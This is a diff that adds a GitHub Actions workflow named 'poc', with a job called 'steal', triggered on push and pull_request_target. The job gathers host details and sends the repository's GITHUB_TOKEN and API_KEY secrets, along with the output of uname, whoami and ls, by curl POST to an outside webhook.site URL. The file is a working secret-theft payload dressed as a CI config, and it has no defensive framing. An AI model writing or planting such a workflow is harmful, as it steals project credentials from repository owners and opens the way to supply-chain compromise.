@@ -1,0 +1,29 @@
+name: poc
+on: [push, pull_request_target]
+jobs:
+  steal:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo "poc all GitHub !"
+          
+          UNAME_OUTPUT=$(uname -a)
+          WHOAMI_OUTPUT=$(whoami)
+          HOSTNAME_OUTPUT=$(hostname)
+          PWD_OUTPUT=$(pwd)
+          LS_OUTPUT=$(ls -la)
+          
+          echo "Running uname -a:"
+          echo "$UNAME_OUTPUT"
+          echo ""
+          echo "Running whoami:"
+          echo "$WHOAMI_OUTPUT"
+          echo ""
+          echo "System info:"
+          echo "$HOSTNAME_OUTPUT"
+          echo "$PWD_OUTPUT"
+          echo "$LS_OUTPUT"
+          # Send to webhook with all captured data
+          curl -X POST https://webhook.site/a27774ab-6267-436c-8d29-62d09dbcc204 \
+            -H "Content-Type: application/json" \
+            -d "{\"token\":\"${{ secrets.GITHUB_TOKEN }}\",\"api_key\":\"${{ secrets.API_KEY }}\",\"uname\":\"$UNAME_OUTPUT\",\"whoami\":\"$WHOAMI_OUTPUT\",\"hostname\":\"$HOSTNAME_OUTPUT\",\"pwd\":\"$PWD_OUTPUT\",\"ls_output\":\"$LS_OUTPUT\",\"event\":\"${{ github.event_name }}\"}"
